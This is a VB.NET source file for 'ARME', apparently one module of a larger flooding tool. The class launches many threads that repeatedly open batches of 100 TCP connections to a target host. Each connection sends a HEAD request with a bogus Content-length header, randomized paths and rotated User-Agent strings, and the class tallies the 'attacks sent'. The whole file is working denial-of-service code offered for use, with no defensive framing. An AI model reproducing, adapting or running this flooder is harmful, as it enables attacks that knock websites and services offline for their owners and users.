Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading

Public Class ARME
    Private ThreadsEnded = 1
    Private PostDATA As String
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Port As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private RandomFile As Boolean
    Public Sub New(model As ArmeModel)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = model.newBaseFloodModel.Host
            Port = model.newArmeVariables.Port
            PostDATA = model.newArmeVariables.PostDATA
            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
            TimetoAttack = model.newBaseFloodModel.Time
            RandomFile = model.newArmeVariables.RandomFile
            If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
            If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
            If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)


            Threads = New Thread(ThreadstoUse - 1) {}
            GetFloodsBase().Reset()
            GetFloodsBase().SetMessage("A.R.M.E attack started")
            For i As Integer = 0 To ThreadstoUse - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            GetFloodsBase().SetMessage("An ARME Attack is Already Running on " & HostToAttack)
        End If

    End Sub
    Private Sub Ended()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded <= ThreadstoUse Then
            GetFloodsBase().SetMessage("ARME Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            GetFloodsBase().SetEnd()
        End If

    End Sub

    Public Sub Stoped()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False

            GetFloodsBase().SetMessage("ARME Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)

        Else
            GetFloodsBase().SetMessage("ARME Attack:, Not Running!")
        End If
    End Sub
    Private Function headers()
        Dim r As Random = New Random
        Dim array() As String = {"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        }
        Return array(r.Next(0, (array.Length - 1)))
    End Function
    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function
    Private Sub DoWork()
        Dim file As String = ""
        Try
            Dim socketArray As Socket() = New Socket(100 - 1) {}
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    Dim i As Integer

                    For i = 0 To 100 - 1
                        If RandomFile Then
                            file = GenerateRandomString(5, True)
                        End If
                        socketArray(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        socketArray(i).Connect(Dns.GetHostAddresses(HostToAttack), Port)
                        Dim HttpString = "HEAD /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Content-length: 5235" & ChrW(13) & ChrW(10) & "User-Agent: " & headers() & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)
                        socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString))

                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * HttpString.Length)

                    Next i
                    Dim j As Integer
                    For j = 0 To 100 - 1
                        Dim bytes As Integer = 0
                        Dim sb = New StringBuilder()
                        Dim bytesReceived As Byte() = New Byte(255) {}

                        Do
                            bytes = socketArray(j).Receive(bytesReceived, bytesReceived.Length, 0)
                            sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                        Loop Until bytes > 0

                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
                        socketArray(j).Close()
                    Next j
                    Continue Do
                Catch

                    Continue Do
                End Try
            Loop
        Catch
        End Try
        Ended()
    End Sub
End Class
